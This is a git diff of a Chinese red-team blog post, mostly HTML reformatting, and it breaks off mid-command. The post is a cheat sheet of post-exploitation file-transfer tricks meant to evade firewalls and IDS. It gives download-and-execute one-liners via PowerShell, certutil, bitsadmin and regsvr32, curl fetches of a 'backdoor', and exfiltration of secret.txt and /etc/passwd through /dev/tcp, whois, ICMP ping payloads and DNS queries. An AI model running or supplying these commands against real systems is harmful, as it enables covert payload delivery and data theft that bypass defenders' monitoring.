@@ -20,17 +20,27 @@
     <meta name="author" content="Misaki">
     <meta name="keywords" content="">
     <title>红队后渗透测试中的文件传输技巧 ~ Misaki&#39;s Blog</title>
-    <link rel="stylesheet" href="/css/Material_Icons.css">
-    <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
+    
+<link rel="stylesheet" href="/css/Material_Icons.css">
+
+    <!-- 
+<link rel="stylesheet" href="/css/font-awesome.css">
+ -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
-    <link rel="stylesheet" href="/css/main.css">
     
-        <link rel="stylesheet" href="/css/post.css">
+<link rel="stylesheet" href="/css/main.css">
+
+    
         
-            <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+<link rel="stylesheet" href="/css/post.css">
+
+        
+            
+<link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+
         
     
-</head>
+<meta name="generator" content="Hexo 5.2.0"></head>
 
 <body class=" sidebar-collapse">
 <nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
@@ -112,68 +122,83 @@
       <div class="container">
         <div class="section">
           <div class="post_content">
-              <p>原文链接：<a href="https://xax007.github.io/2019-01-13-post-exploitation-file-transfer-tips/" target="_blank" rel="noopener">https://xax007.github.io/2019-01-13-post-exploitation-file-transfer-tips/</a></p>
+              <p>原文链接：<a target="_blank" rel="noopener" href="https://xax007.github.io/2019-01-13-post-exploitation-file-transfer-tips/">https://xax007.github.io/2019-01-13-post-exploitation-file-transfer-tips/</a></p>
 <p>在红队渗透测试当中往往需要最大化利用当前的环境绕过重兵防守的系统的防火墙、IDS、IPS等报警和监控系统进行文件传输，本文列出了多种利用操作系统默认自带的工具进行文件传输的方法。</p>
 <h3 id="搭建-HTTP-server"><a href="#搭建-HTTP-server" class="headerlink" title="搭建 HTTP server"></a>搭建 HTTP server</h3><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><p>python2:</p>
-<pre><code>python -m SimpleHTTPServer 1337
-</code></pre><p>以上命令会在当前目录启动 HTTP 服务，端口为 1337</p>
+<pre class="line-numbers language-none"><code class="language-none">python -m SimpleHTTPServer 1337<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>以上命令会在当前目录启动 HTTP 服务，端口为 1337</p>
 <p>python3:</p>
-<pre><code>python -m http.server 1337
-</code></pre><p>以上命令会在当前目录启动 HTTP 服务，端口为 1337</p>
+<pre class="line-numbers language-none"><code class="language-none">python -m http.server 1337<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>以上命令会在当前目录启动 HTTP 服务，端口为 1337</p>
 <h4 id="PHP-5-4"><a href="#PHP-5-4" class="headerlink" title="PHP 5.4+"></a>PHP 5.4+</h4><p>当 PHP 版本大于 5.4 是，可使用 PHP 在当前目录启动 HTTP 服务，端口为 1337</p>
-<pre><code>php -S 0.0.0.0:1337
-</code></pre><h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><p>下面的命令会在当前目录下启动 HTTP 服务，端口为 1337</p>
-<pre><code>ruby -rwebrick -e&#39;WEBrick::HTTPServer.new(:Port =&gt; 1337, :DocumentRoot =&gt; Dir.pwd).start&#39;
-</code></pre><h4 id="Ruby-1-9-2"><a href="#Ruby-1-9-2" class="headerlink" title="Ruby 1.9.2+"></a>Ruby 1.9.2+</h4><pre><code>ruby -run -e httpd . -p 1337
-</code></pre><h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><pre><code>perl -MHTTP::Server::Brick -e &#39;$s=HTTP::Server::Brick-&gt;new(port=&gt;1337); $s-&gt;mount(&quot;/&quot;=&gt;{path=&gt;&quot;.&quot;}); $s-&gt;start&#39;
-perl -MIO::All -e &#39;io(&quot;:8080&quot;)-&gt;fork-&gt;accept-&gt;(sub { $_[0] &lt; io(-x $1 +? &quot;./$1 |&quot; : $1) if /^GET \/(.*) / })&#39;
-</code></pre><p>Thanks to: <a href="http://stackoverflow.com/questions/8058793/single-line-python-webserver" target="_blank" rel="noopener">http://stackoverflow.com/questions/8058793/single-line-python-webserver</a></p>
-<h4 id="busybox-httpd"><a href="#busybox-httpd" class="headerlink" title="busybox httpd"></a>busybox httpd</h4><pre><code>busybox httpd -f -p 8000
-</code></pre><p>本条来自:<a href="https://gist.github.com/willurd/5720255#comment-841915" target="_blank" rel="noopener">lvm</a></p>
+<pre class="line-numbers language-none"><code class="language-none">php -S 0.0.0.0:1337<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><p>下面的命令会在当前目录下启动 HTTP 服务，端口为 1337</p>
+<pre class="line-numbers language-none"><code class="language-none">ruby -rwebrick -e&#39;WEBrick::HTTPServer.new(:Port &#x3D;&gt; 1337, :DocumentRoot &#x3D;&gt; Dir.pwd).start&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="Ruby-1-9-2"><a href="#Ruby-1-9-2" class="headerlink" title="Ruby 1.9.2+"></a>Ruby 1.9.2+</h4><pre class="line-numbers language-none"><code class="language-none">ruby -run -e httpd . -p 1337<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><pre class="line-numbers language-none"><code class="language-none">perl -MHTTP::Server::Brick -e &#39;$s&#x3D;HTTP::Server::Brick-&gt;new(port&#x3D;&gt;1337); $s-&gt;mount(&quot;&#x2F;&quot;&#x3D;&gt;&#123;path&#x3D;&gt;&quot;.&quot;&#125;); $s-&gt;start&#39;
+perl -MIO::All -e &#39;io(&quot;:8080&quot;)-&gt;fork-&gt;accept-&gt;(sub &#123; $_[0] &lt; io(-x $1 +? &quot;.&#x2F;$1 |&quot; : $1) if &#x2F;^GET \&#x2F;(.*) &#x2F; &#125;)&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>Thanks to: <a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/8058793/single-line-python-webserver">http://stackoverflow.com/questions/8058793/single-line-python-webserver</a></p>
+<h4 id="busybox-httpd"><a href="#busybox-httpd" class="headerlink" title="busybox httpd"></a>busybox httpd</h4><pre class="line-numbers language-none"><code class="language-none">busybox httpd -f -p 8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>本条来自:<a target="_blank" rel="noopener" href="https://gist.github.com/willurd/5720255#comment-841915">lvm</a></p>
 <h3 id="从-HTTP-server-下载文件"><a href="#从-HTTP-server-下载文件" class="headerlink" title="从 HTTP server 下载文件"></a>从 HTTP server 下载文件</h3><p>以下列出了在 Windows 和 Linux 系统下使用系统自带工具从 HTTP Server 下载文件的几种方法</p>
 <h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><p>下载并执行:</p>
-<pre><code>powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://1.2.3.4/5.exe&#39;,&#39;c:\download\a.exe&#39;);start-process &#39;c:\download\a.exe&#39;
-</code></pre><h4 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h4><p>下载并执行:</p>
-<pre><code>certutil -urlcache -split -f http://1.2.3.4/5.exe c:\download\a.exe&amp;&amp;c:\download\a.exe
-</code></pre><h4 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h4><p>下载并执行:</p>
-<pre><code>bitsadmin /transfer n http://1.2.3.4/5.exe c:\download\a.exe &amp;&amp; c:\download\a.exe
-</code></pre><p>⚠️ bitsadmin 的下载速度比较慢</p>
-<h4 id="regsvr32"><a href="#regsvr32" class="headerlink" title="regsvr32"></a>regsvr32</h4><pre><code>regsvr32 /u /s /i:http://1.2.3.4/5.exe scrobj.dll
-</code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h4><pre><code>curl http://1.2.3.4/backdoor
-</code></pre><h4 id="Wget"><a href="#Wget" class="headerlink" title="Wget"></a>Wget</h4><pre><code>wget http://1.2.3.4/backdoor
-</code></pre><h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><p>在使用 awk 进行下载文件时，首先使用以上列出的任意一条命令启动一个 HTTP Server</p>
-<pre><code>awk &#39;BEGIN {
-  RS = ORS = &quot;\r\n&quot;
-  HTTPCon = &quot;/inet/tcp/0/127.0.0.1/1337&quot;
-  print &quot;GET /secret.txt HTTP/1.1\r\nConnection: close\r\n&quot;    |&amp; HTTPCon
+<pre class="line-numbers language-none"><code class="language-none">powershell (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;1.2.3.4&#x2F;5.exe&#39;,&#39;c:\download\a.exe&#39;);start-process &#39;c:\download\a.exe&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h4><p>下载并执行:</p>
+<pre class="line-numbers language-none"><code class="language-none">certutil -urlcache -split -f http:&#x2F;&#x2F;1.2.3.4&#x2F;5.exe c:\download\a.exe&amp;&amp;c:\download\a.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h4><p>下载并执行:</p>
+<pre class="line-numbers language-none"><code class="language-none">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;1.2.3.4&#x2F;5.exe c:\download\a.exe &amp;&amp; c:\download\a.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>⚠️ bitsadmin 的下载速度比较慢</p>
+<h4 id="regsvr32"><a href="#regsvr32" class="headerlink" title="regsvr32"></a>regsvr32</h4><pre class="line-numbers language-none"><code class="language-none">regsvr32 &#x2F;u &#x2F;s &#x2F;i:http:&#x2F;&#x2F;1.2.3.4&#x2F;5.exe scrobj.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h4><pre class="line-numbers language-none"><code class="language-none">curl http:&#x2F;&#x2F;1.2.3.4&#x2F;backdoor<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="Wget"><a href="#Wget" class="headerlink" title="Wget"></a>Wget</h4><pre class="line-numbers language-none"><code class="language-none">wget http:&#x2F;&#x2F;1.2.3.4&#x2F;backdoor<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><p>在使用 awk 进行下载文件时，首先使用以上列出的任意一条命令启动一个 HTTP Server</p>
+<pre class="line-numbers language-none"><code class="language-none">awk &#39;BEGIN &#123;
+  RS &#x3D; ORS &#x3D; &quot;\r\n&quot;
+  HTTPCon &#x3D; &quot;&#x2F;inet&#x2F;tcp&#x2F;0&#x2F;127.0.0.1&#x2F;1337&quot;
+  print &quot;GET &#x2F;secret.txt HTTP&#x2F;1.1\r\nConnection: close\r\n&quot;    |&amp; HTTPCon
   while (HTTPCon |&amp; getline &gt; 0)
       print $0
   close(HTTPCon)
-}&#39;
-</code></pre><p>效果：</p>
-<p><img src="\2019\03\红队后渗透测试中的文件传输技巧\2019-03-05-062002.png" alt="img"></p>
+&#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>效果：</p>
+<p><img src="%5C2019%5C03%5C%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7%5C2019-03-05-062002.png" alt="img"></p>
 <h3 id="Setup-HTTP-PUT-server"><a href="#Setup-HTTP-PUT-server" class="headerlink" title="Setup HTTP PUT server"></a>Setup HTTP PUT server</h3><p>以下列出了上传文件到 HTTP Server 的几种方法</p>
-<h4 id="使用-Nginx-搭建-HTTP-PUT-Server"><a href="#使用-Nginx-搭建-HTTP-PUT-Server" class="headerlink" title="使用 Nginx 搭建 HTTP PUT Server"></a>使用 Nginx 搭建 HTTP PUT Server</h4><pre><code>mkdir -p /var/www/upload/ # 创建目录 
-chown www-data:www-data /var/www/upload/ # 修改目录所属用户和组
-cd /etc/nginx/sites-available # 进入 nginx 虚拟主机目录
+<h4 id="使用-Nginx-搭建-HTTP-PUT-Server"><a href="#使用-Nginx-搭建-HTTP-PUT-Server" class="headerlink" title="使用 Nginx 搭建 HTTP PUT Server"></a>使用 Nginx 搭建 HTTP PUT Server</h4><pre class="line-numbers language-none"><code class="language-none">mkdir -p &#x2F;var&#x2F;www&#x2F;upload&#x2F; # 创建目录 
+chown www-data:www-data &#x2F;var&#x2F;www&#x2F;upload&#x2F; # 修改目录所属用户和组
+cd &#x2F;etc&#x2F;nginx&#x2F;sites-available # 进入 nginx 虚拟主机目录
 
 # 写入配置到 file_upload 文件
 cat &lt;&lt;EOF &gt; file_upload
-server {
-    listen 8001 default_server;
-    server_name kali;
-        location / {
-        root /var/www/upload;
-        dav_methods PUT;
-    }
-}
+server &#123;
+	listen 8001 default_server;
+	server_name kali;
+        location &#x2F; &#123;
+		root &#x2F;var&#x2F;www&#x2F;upload;
+		dav_methods PUT;
+	&#125;
+&#125;
 EOF
 # 写入完毕
-cd ../sites-enable # 进入 nginx 虚拟主机启动目录
-ln -s /etc/nginx/sites-available/file_upload file_upload # 启用 file_upload 虚拟主机
-systemctl start nginx # 启动 Nginx
-</code></pre><h4 id="使用-Python-搭建-HTTP-PUT-Server"><a href="#使用-Python-搭建-HTTP-PUT-Server" class="headerlink" title="使用 Python 搭建 HTTP PUT Server"></a>使用 Python 搭建 HTTP PUT Server</h4><p>以下代码保存到 <code>HTTPutServer.py</code> 文件里:</p>
-<pre><code># ref: https://www.snip2code.com/Snippet/905666/Python-HTTP-PUT-test-server
+cd ..&#x2F;sites-enable # 进入 nginx 虚拟主机启动目录
+ln -s &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;file_upload file_upload # 启用 file_upload 虚拟主机
+systemctl start nginx # 启动 Nginx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="使用-Python-搭建-HTTP-PUT-Server"><a href="#使用-Python-搭建-HTTP-PUT-Server" class="headerlink" title="使用 Python 搭建 HTTP PUT Server"></a>使用 Python 搭建 HTTP PUT Server</h4><p>以下代码保存到 <code>HTTPutServer.py</code> 文件里:</p>
+<pre class="line-numbers language-none"><code class="language-none"># ref: https:&#x2F;&#x2F;www.snip2code.com&#x2F;Snippet&#x2F;905666&#x2F;Python-HTTP-PUT-test-server
 import sys
 import signal
 from threading import Thread
@@ -183,86 +208,99 @@ from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
 
 class PUTHandler(BaseHTTPRequestHandler):
     def do_PUT(self):
-        length = int(self.headers[&#39;Content-Length&#39;])
-        content = self.rfile.read(length)
+        length &#x3D; int(self.headers[&#39;Content-Length&#39;])
+        content &#x3D; self.rfile.read(length)
         self.send_response(200)
         with open(self.path[1:], &quot;w&quot;) as f:
             f.write(content)
 
 
 def run_on(port):
-    print(&quot;Starting a HTTP PUT Server on {0} port {1} (http://{0}:{1}) ...&quot;.format(sys.argv[1], port))
-    server_address = (sys.argv[1], port)
-    httpd = HTTPServer(server_address, PUTHandler)
+    print(&quot;Starting a HTTP PUT Server on &#123;0&#125; port &#123;1&#125; (http:&#x2F;&#x2F;&#123;0&#125;:&#123;1&#125;) ...&quot;.format(sys.argv[1], port))
+    server_address &#x3D; (sys.argv[1], port)
+    httpd &#x3D; HTTPServer(server_address, PUTHandler)
     httpd.serve_forever()
 
 
-if __name__ == &quot;__main__&quot;:
+if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
     if len(sys.argv) &lt; 3:
-        print(&quot;Usage:\n\tpython {0} ip 1337&quot;.format(sys.argv[0]))
+        print(&quot;Usage:\n\tpython &#123;0&#125; ip 1337&quot;.format(sys.argv[0]))
         sys.exit(1)
-    ports = [int(arg) for arg in sys.argv[2:]]
+    ports &#x3D; [int(arg) for arg in sys.argv[2:]]
     try:
         for port_number in ports:
-            server = Thread(target=run_on, args=[port_number])
-            server.daemon = True # Do not make us wait for you to exit
+            server &#x3D; Thread(target&#x3D;run_on, args&#x3D;[port_number])
+            server.daemon &#x3D; True # Do not make us wait for you to exit
         server.start()
         signal.pause() # Wait for interrupt signal, e.g. KeyboardInterrupt
     except KeyboardInterrupt:
         print &quot;\nPython HTTP PUT Server Stoped.&quot;
-        sys.exit(1)
-</code></pre><p>运行方法:</p>
-<pre><code>$ python HTTPutServer.py 10.10.10.100 1337
-Starting a HTTP PUT Server on 10.10.10.100 port 1337 (http://10.10.10.100:1337) ...
+        sys.exit(1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</code></pre><h3 id="上传文件到-HTTP-PUT-server"><a href="#上传文件到-HTTP-PUT-server" class="headerlink" title="上传文件到 HTTP PUT server"></a>上传文件到 HTTP PUT server</h3><h4 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h4><h4 id="Curl-1"><a href="#Curl-1" class="headerlink" title="Curl"></a>Curl</h4><pre><code>$ curl --upload-file secret.txt http://ip:port/
+<p>运行方法:</p>
+<pre class="line-numbers language-none"><code class="language-none">$ python HTTPutServer.py 10.10.10.100 1337
+Starting a HTTP PUT Server on 10.10.10.100 port 1337 (http:&#x2F;&#x2F;10.10.10.100:1337) ...
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-</code></pre><h4 id="Wget-1"><a href="#Wget-1" class="headerlink" title="Wget"></a>Wget</h4><pre><code>$ wget --method=PUT --post-file=secret.txt http://ip:port/
+<h3 id="上传文件到-HTTP-PUT-server"><a href="#上传文件到-HTTP-PUT-server" class="headerlink" title="上传文件到 HTTP PUT server"></a>上传文件到 HTTP PUT server</h3><h4 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h4><h4 id="Curl-1"><a href="#Curl-1" class="headerlink" title="Curl"></a>Curl</h4><pre class="line-numbers language-none"><code class="language-none">$ curl --upload-file secret.txt http:&#x2F;&#x2F;ip:port&#x2F;
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</code></pre><h4 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h4><h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><pre><code>$body = Get-Content secret.txt
-Invoke-RestMethod -Uri http://ip:port/secret.txt -Method PUT -Body $body
+<h4 id="Wget-1"><a href="#Wget-1" class="headerlink" title="Wget"></a>Wget</h4><pre class="line-numbers language-none"><code class="language-none">$ wget --method&#x3D;PUT --post-file&#x3D;secret.txt http:&#x2F;&#x2F;ip:port&#x2F;
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</code></pre><h3 id="使用-Bash-dev-tcp-进行文件传输"><a href="#使用-Bash-dev-tcp-进行文件传输" class="headerlink" title="使用 Bash /dev/tcp 进行文件传输"></a>使用 Bash /dev/tcp 进行文件传输</h3><p>首先需要监听端口</p>
+<h4 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h4><h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><pre class="line-numbers language-none"><code class="language-none">$body &#x3D; Get-Content secret.txt
+Invoke-RestMethod -Uri http:&#x2F;&#x2F;ip:port&#x2F;secret.txt -Method PUT -Body $body
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="使用-Bash-dev-tcp-进行文件传输"><a href="#使用-Bash-dev-tcp-进行文件传输" class="headerlink" title="使用 Bash /dev/tcp 进行文件传输"></a>使用 Bash /dev/tcp 进行文件传输</h3><p>首先需要监听端口</p>
 <p>接收端:</p>
-<pre><code>nc -lvnp 1337 &gt; secret.txt 
+<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 1337 &gt; secret.txt 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</code></pre><p>发送端:</p>
-<pre><code>cat secret.txt &gt; /dev/tcp/ip/port
+<p>发送端:</p>
+<pre class="line-numbers language-none"><code class="language-none">cat secret.txt &gt; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</code></pre><p><img src="\2019\03\红队后渗透测试中的文件传输技巧\2019-03-05-060100.png" alt="img"></p>
-<h3 id="使用-SMB-协议进行文件传输"><a href="#使用-SMB-协议进行文件传输" class="headerlink" title="使用 SMB 协议进行文件传输"></a>使用 SMB 协议进行文件传输</h3><h4 id="搭建简易-SMB-Server"><a href="#搭建简易-SMB-Server" class="headerlink" title="搭建简易 SMB Server"></a>搭建简易 SMB Server</h4><p>搭建简易SMB Server 需要用到 <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">Impacket</a> 项目的 <code>smbserver.py</code> 文件</p>
+<p><img src="%5C2019%5C03%5C%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7%5C2019-03-05-060100.png" alt="img"></p>
+<h3 id="使用-SMB-协议进行文件传输"><a href="#使用-SMB-协议进行文件传输" class="headerlink" title="使用 SMB 协议进行文件传输"></a>使用 SMB 协议进行文件传输</h3><h4 id="搭建简易-SMB-Server"><a href="#搭建简易-SMB-Server" class="headerlink" title="搭建简易 SMB Server"></a>搭建简易 SMB Server</h4><p>搭建简易SMB Server 需要用到 <a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">Impacket</a> 项目的 <code>smbserver.py</code> 文件</p>
 <p><code>Impacket</code> 已默认安装在 Kali Linux 系统中</p>
 <p><strong>syntax:</strong> <code>impacker-smbserver ShareName SharePath</code></p>
-<pre><code>$ mkdir smb # 创建 smb 目录
+<pre class="line-numbers language-none"><code class="language-none">$ mkdir smb # 创建 smb 目录
 $ cd smb # 进入 smb目录
-$ impacket-smbserver share `pwd` # 在当前目录启动 SMB server，共享名称为 share
+$ impacket-smbserver share &#96;pwd&#96; # 在当前目录启动 SMB server，共享名称为 share
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-</code></pre><p>效果：</p>
-<p><img src="\2019\03\红队后渗透测试中的文件传输技巧\2019-01-13-151350.png" alt="img"></p>
-<h4 id="从-SMB-server-下载文件"><a href="#从-SMB-server-下载文件" class="headerlink" title="从 SMB server 下载文件"></a>从 SMB server 下载文件</h4><pre><code>copy \\IP\ShareName\file.exe file.exe
+<p>效果：</p>
+<p><img src="%5C2019%5C03%5C%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7%5C2019-01-13-151350.png" alt="img"></p>
+<h4 id="从-SMB-server-下载文件"><a href="#从-SMB-server-下载文件" class="headerlink" title="从 SMB server 下载文件"></a>从 SMB server 下载文件</h4><pre class="line-numbers language-none"><code class="language-none">copy \\IP\ShareName\file.exe file.exe
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</code></pre><h4 id="上传文件到-SMB-server"><a href="#上传文件到-SMB-server" class="headerlink" title="上传文件到 SMB server"></a>上传文件到 SMB server</h4><pre><code>net use x: \\IP\ShareName
+<h4 id="上传文件到-SMB-server"><a href="#上传文件到-SMB-server" class="headerlink" title="上传文件到 SMB server"></a>上传文件到 SMB server</h4><pre class="line-numbers language-none"><code class="language-none">net use x: \\IP\ShareName
 
 copy file.txt x:
 
-net use x: /delete
+net use x: &#x2F;delete
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</code></pre><h4 id="使用-whois-命令进行文件传输"><a href="#使用-whois-命令进行文件传输" class="headerlink" title="使用 whois 命令进行文件传输"></a>使用 whois 命令进行文件传输</h4><p>graph LR A[Host A] – /etc/passwd –&gt; B[Host B]</p>
+<h4 id="使用-whois-命令进行文件传输"><a href="#使用-whois-命令进行文件传输" class="headerlink" title="使用 whois 命令进行文件传输"></a>使用 whois 命令进行文件传输</h4><p>graph LR A[Host A] – /etc/passwd –&gt; B[Host B]</p>
 <p>接收端 Host B：</p>
-<pre><code>nc -vlnp 1337 | sed &quot;s/ //g&quot; | base64 -d 
+<pre class="line-numbers language-none"><code class="language-none">nc -vlnp 1337 | sed &quot;s&#x2F; &#x2F;&#x2F;g&quot; | base64 -d 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</code></pre><p>发送端 Host A：</p>
-<pre><code>whois -h 127.0.0.1 -p 1337 `cat /etc/passwd | base64` 
+<p>发送端 Host A：</p>
+<pre class="line-numbers language-none"><code class="language-none">whois -h 127.0.0.1 -p 1337 &#96;cat &#x2F;etc&#x2F;passwd | base64&#96; 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</code></pre><p>效果：</p>
-<p><img src="\2019\03\红队后渗透测试中的文件传输技巧\2019-01-13-082852.png" alt="img"></p>
+<p>效果：</p>
+<p><img src="%5C2019%5C03%5C%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7%5C2019-01-13-082852.png" alt="img"></p>
 <h4 id="使用-ping-命令进行文件传输"><a href="#使用-ping-命令进行文件传输" class="headerlink" title="使用 ping 命令进行文件传输"></a>使用 ping 命令进行文件传输</h4><p>graph LR A[Sender] – secret.txt –&gt; B[Reciver]</p>
 <p>发送端:</p>
-<pre><code>xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done
+<pre class="line-numbers language-none"><code class="language-none">xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</code></pre><p>接收端:</p>
+<p>接收端:</p>
 <p>以下代码保存到 <code>ping_receiver.py</code></p>
-<pre><code>import sys
+<pre class="line-numbers language-none"><code class="language-none">import sys
 
 try:
     from scapy.all import *
@@ -273,68 +311,77 @@ except:
 
 def process_packet(pkt):
     if pkt.haslayer(ICMP):
-        if pkt[ICMP].type == 8:
-            data = pkt[ICMP].load[-4:]
-            print(f&#39;{data.decode(&quot;utf-8&quot;)}&#39;, flush=True, end=&quot;&quot;, sep=&quot;&quot;)
+        if pkt[ICMP].type &#x3D;&#x3D; 8:
+            data &#x3D; pkt[ICMP].load[-4:]
+            print(f&#39;&#123;data.decode(&quot;utf-8&quot;)&#125;&#39;, flush&#x3D;True, end&#x3D;&quot;&quot;, sep&#x3D;&quot;&quot;)
 
-sniff(iface=&quot;eth0&quot;, prn=process_packet)
+sniff(iface&#x3D;&quot;eth0&quot;, prn&#x3D;process_packet)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</code></pre><p>执行方法:</p>
-<pre><code>python3 ping_receiver.py
+<p>执行方法:</p>
+<pre class="line-numbers language-none"><code class="language-none">python3 ping_receiver.py
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</code></pre><p>效果</p>
-<p><img src="\2019\03\红队后渗透测试中的文件传输技巧\2019-01-13-082203.png" alt="img"></p>
+<p>效果</p>
+<p><img src="%5C2019%5C03%5C%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7%5C2019-01-13-082203.png" alt="img"></p>
 <h4 id="使用-dig-命令进行文件传输"><a href="#使用-dig-命令进行文件传输" class="headerlink" title="使用 dig 命令进行文件传输"></a>使用 dig 命令进行文件传输</h4><p>graph LR A[Sender] – /etc/passwd –&gt; B[Reciver]</p>
 <p>发送端:</p>
-<pre><code>xxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1 +time=1 $line.gooogle.com; done
